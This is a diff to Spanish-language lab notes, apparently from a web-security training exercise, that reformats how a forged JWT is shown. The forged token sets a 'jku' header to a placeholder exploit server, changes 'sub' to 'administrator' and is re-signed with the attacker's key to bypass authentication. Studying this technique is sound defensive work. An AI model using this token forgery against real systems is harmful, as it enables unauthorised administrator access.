@@ -17,17 +17,15 @@ El server descarga la clave de verificación desde la **URL del header `jku`** s
 
 ## JWT (original → modificado)
 
-**Original** (decodificado)
-```json
-{ "kid": "…", "alg": "RS256" }                                        // header
-{ "sub": "wiener" }                                                   // payload
-```
-**Modificado**
-```json
-{ "kid": "<tu-kid>", "alg": "RS256", "jku": "https://TU-EXPLOIT-SERVER/exploit" }   // header   ← agregado
-{ "sub": "administrator" }                                                          // payload  ← cambiado
-```
-> **Firma:** **re-firmada** con tu clave privada; el server baja tu JWKS desde el `jku` (el `kid` debe coincidir con el de tu clave).
+Las 3 partes decodificadas. <mark style="background:#a5d6a7;color:#111">🎯 objetivo</mark> = lo que querés · <mark style="background:#ffcc80;color:#111">⚙️ consecuencia</mark> = lo que cambia para que valide.
+
+| Parte | Original | Modificado |
+| --- | --- | --- |
+| **header** | { "kid": "…", "alg": "RS256" } | { "kid": "<tu-kid>", "alg": "RS256", <mark style="background:#ffcc80;color:#111">"jku": "https://TU-EXPLOIT-SERVER/exploit"</mark> } |
+| **payload** | { "sub": "wiener" } | { "sub": <mark style="background:#a5d6a7;color:#111">"administrator"</mark> } |
+| **signature** | RSA (clave privada del server) | <mark style="background:#ffcc80;color:#111">re-firmada con TU clave privada</mark> (el server baja tu JWKS del `jku`) |
+
+> **🎯 Objetivo:** `sub → administrator`. **⚙️ Consecuencia:** apuntar `jku` a tu JWKS y **re-firmar** con tu clave privada (el `kid` debe coincidir con el de tu clave).
 
 ## Diagrama
 
